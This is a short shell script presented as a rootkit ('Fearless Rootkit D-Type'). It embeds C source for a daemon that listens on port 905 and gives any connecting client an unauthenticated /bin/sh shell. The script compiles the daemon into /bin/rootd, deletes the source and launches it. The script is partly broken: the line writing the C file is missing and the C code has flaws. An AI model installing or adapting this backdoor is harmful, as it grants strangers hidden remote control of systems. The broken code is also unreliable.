#!/bin/sh

# Fearless Rootkit D-Type v0.1
# Coded by Merlion 
# Website: http://areyoufearless.com

# chmod 755 rootd.sh
# ./rootd.sh
# telnet to port 905 & run commands. End each command with a semicolon (;)



                     

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

void die(char *error);
main(int argc, char **argv) {
pid_t pid, sid;
int len, clipid, serpid, stat, sock, soklen, sockbind, sockrec, sockopt, sockcli, socklen;
unsigned short int mcon;
unsigned short int port;
char *rbuf, *rmode;
struct sockaddr_in  Client, Server;
if ((sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) die("Error creating socket");
if (argc != 3) die("Usage");
memset(&Server, 0, sizeof(Server));
Server.sin_family=AF_INET;
port=905;
mcon=5;
Server.sin_port=htons(port);
Server.sin_addr.s_addr=htonl(INADDR_ANY);
if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (void *) &sockopt, sizeof(sockopt)) < 0)
die("No socket options set");
if (sockbind=bind(sock, (struct sockaddr *) &Server, sizeof(Server)) != 0)
die("Could not bind socket");
if ((sockbind=listen(sock, mcon)) != 0) die("Failed on listen()");  
pid=fork();
if (pid < 0) die("Initial fork() failed");
if (pid>0) exit(0);
if ((chdir("/")) < 0) die("Could not set working directory");
if ((setsid()) < 0) die("setsid() failed in creating daemon");
umask(0);
close(STDIN_FILENO);
close(STDOUT_FILENO);
close(STDERR_FILENO);
/* You're on your own, pal.. */
while(1) {
socklen=sizeof(Client);
if ((sockcli=accept(sock, (struct sockaddr *) &Client, &socklen)) < 0) exit(1);   /* syslog msg here still */
clipid=getpid();
serpid=fork();
if (serpid > 0)
waitpid(0, &stat, 0);    
dup2(sockcli, 1);
execl("/bin/sh","sh",(char *)0);  }
close(sockcli);   }
void die(char *error) {
fprintf(stderr, "%s\n", error);
exit(1);  }

EOF

gcc -o /bin/rootd /tmp/rootd.c
rm -f /tmp/rootd.c
rootd $port $max
echo "Rootkit installed at port 905"
exit 0